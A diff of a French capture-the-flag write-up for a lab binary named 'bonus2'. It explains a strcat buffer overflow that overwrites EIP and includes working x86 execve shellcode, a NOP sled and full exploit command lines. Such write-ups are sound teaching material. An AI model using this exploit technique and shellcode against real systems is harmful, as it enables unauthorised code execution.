@@ -18,4 +18,32 @@ EIP = offset 23
 
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
 
-r $(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "a" * 50)') $(python -c 'print("\x90" * 18 + "\x50\xf5\xff\xbf" + "a" * 50)')
+./bonus2 $(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f")') $(python -c 'print("\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "a" * 4 + "\x3f\xf6\xff\xbf" + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")')
+
+===============================================================================
+
+Nous avons un binaire qui concatene 2 strings.
+
+Il faut overflow pour ecraser EIP par l'adresse que nous renvoie strcat.
+
+Tout d'abord pour rentrer dans la fonction greetuser (celle qui fait le strcat),
+il faut set la variable d'environemnt LANG a fi information trouvable sous gdb
+au moment du memcmp().
+
+Ensuite on vois en remplissant les 2 buffers qu'on peut ecraser EIP a l'offset 18
+du second buffer.
+
+On remplie notre premier buffer par des NOP ("\x90") puis par la premiere partie
+de notre shellcode (10 premier octets).
+On remplie notre deuxieme buffers par le reste de notre shellcode, puis par 4 octets random
+(pour atteindre EIP) puis par l'adresse du retour de strcat et d'autre caractere random
+qui servirons a overflow notre buffer.
+
+Ce qui donne :
+
+./bonus2 $(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f")') $(python -c 'print("\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "a" * 4 + "\x3f\xf6\xff\xbf" + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")')
+
+Sous gdb et sous le terminal il se peut qu'il y ai un decallage d'adressage.
+
+Le debut du buffer et remplie par des NOP pour pouvoir jumper plus facilement
+sur les NOP qui nous menerons au shellcode.
